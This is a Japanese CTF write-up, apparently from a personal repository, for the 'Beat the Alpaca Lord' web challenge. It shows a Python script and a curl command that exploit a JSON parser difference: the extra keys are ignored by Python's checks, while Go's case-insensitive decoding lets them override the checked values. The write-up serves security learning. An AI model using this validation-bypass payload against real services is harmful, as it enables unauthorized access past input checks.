---
title: "Beat the Alpaca Lord - AlpacaHack Daily"
category: "web"
subcategory: "web"
type: "writeup"
tags: ["web", "alpacahack", "sprintf", "beat", "alpaca", "lord"]
summary: "web writeup for \"Beat the Alpaca Lord\" from AlpacaHack Daily - techniques: alpacahack, sprintf, beat, alpaca, lord."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d16_Beat_the_Alpaca_Lord/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Beat the Alpaca Lord"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Beat the Alpaca Lord
- **Date:** 2026-07-16
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d16_Beat_the_Alpaca_Lord>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202607/d16_Beat_the_Alpaca_Lord/README.md>

---
# Beat the Alpaca Lord

## 問題

ヒーローたちの助けが必要です！

app.py
```py
@app.post("/api/fight")
def fight():
    stats = request.json
    if any(s not in stats or not isinstance(stats[s], int) for s in ["atk", "int", "luk", "def", "dex"]):
        return jsonify({"error": "Invalid stats"})
    
    if stats["atk"] + stats["int"] + stats["luk"] > 500:
        return jsonify({"error": "You are too powerful"})
    
    if stats["def"] + stats["dex"] > 500:
        return jsonify({"error": "You are too tough"})
    
    response = requests.post("http://calc:8080/", json=stats)

    return jsonify(response.json())
```
app.go
```go
func indexHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	if r.Method != http.MethodPost {
		apiErr(w, "Invalid method")
		return
	}

	var stats PlayerStats
	json.NewDecoder(r.Body).Decode(&stats)

	if stats.Atk < 0 || stats.Atk > 1000 ||
		stats.Int < 0 || stats.Int > 1000 ||
		stats.Luk < 0 || stats.Luk > 1000 ||
		stats.Def < 0 || stats.Def > 1000 ||
		stats.Dex < 0 || stats.Dex > 1000 {
		apiErr(w, "Invalid stats")
		return
	}

	if stats.Def+stats.Dex < 1000 {
		apiErr(w, "You are too fragile")
		return
	}

	if stats.Atk+stats.Int+stats.Luk < 1000 {
		apiErr(w, "You are too weak")
		return
	}

	flag := os.Getenv("FLAG")
	message := fmt.Sprintf("You beat the Alpaca Lord! Here's your flag: %s", flag)
	json.NewEncoder(w).Encode(FlagResponse{
		Message: message,
	})
}
```

## 概要

ルートページを開くと、`atk`（攻撃力）、`int`（知力？）、`luk`（運？）、`def`（防御力）、`dex`（？？？）の5つのパラメータをJSONで`/api/fight`に送るフォームが現れます。

Python側は受け取ったJSONデータをチェックし、チェックをパスするとこれをGo側にそのまま投げます。

Go側はさらに異なるチェックを行い、このチェックをパスするとフラグをゲットすることができます。

しかし、このチェックがとても理不尽なものになっています。

Python側では、`atk`+`int`+`luk`>500だと「お前は強すぎる」と文句を言われ、`def`+`dex`>500だと「お前はタフすぎる」と文句を言われます。

しかし、Go側では、`atk`+`int`+`luk`<1000だと「お前は弱すぎる」と文句を言われ、`def`+`dex`<1000だと「お前は脆すぎる」と文句を言われます。

どうすれば相反する二つの条件を両方満たすことができるのでしょうか？

## 結論

下記のPythonスクリプトまたはcurlコマンドでフラグを得ることができます。
```py
import requests

URL = "http://localhost:3000/api/fight"

payload = {
  "atk": 100,
  "int": 100,
  "luk": 100,
  "def": 100,
  "dex": 100,
  "ATK": 1000,
  "DEF": 1000,
}
res = requests.post(URL, json=payload)    
print(res.json())
```
```sh
curl -X POST http://localhost:3000/api/fight \
     -H "Content-Type: application/json" \
     -d '{"atk": 100, "int": 100, "luk": 100, "def": 100, "dex": 100, "ATK": 1000, "DEF": 1000}'
```

## 解説

まず、ルートページの入力フォームには全て0～100の入力制限がかかっています。

これではGo側の条件を絶対に満たせないので、別の方法で`/api/fight`に直接JSONを送りつける必要があります。

次に、Python側の入力JSONデータチェック部分をよく見てみると、

- `atk`,`int`,`luk`,`def`,`dex`を全て持ち、これら全ての値が整数であること。
- `atk`+`int`+`luk`<=500であること。
- `def`+`dex`<=500であること。

をチェックしていますが、これら以外の余計な要素を持つことについてはチェックしていません。

そして、GoのJSONのデコーダーは、Pythonの`json.loads`と違ってキーの大文字/小文字を区別せず、重複がある場合は後勝ちで上書きしてしまうようなのです。

※すみません、私がGoに疎いのでこれ以上の説明はできません。

よって、前記のようなJSONを送ると、Python側では`atk:100`が、Go側では`ATK:1000`が採用され、どちらの条件も満たすことができます。
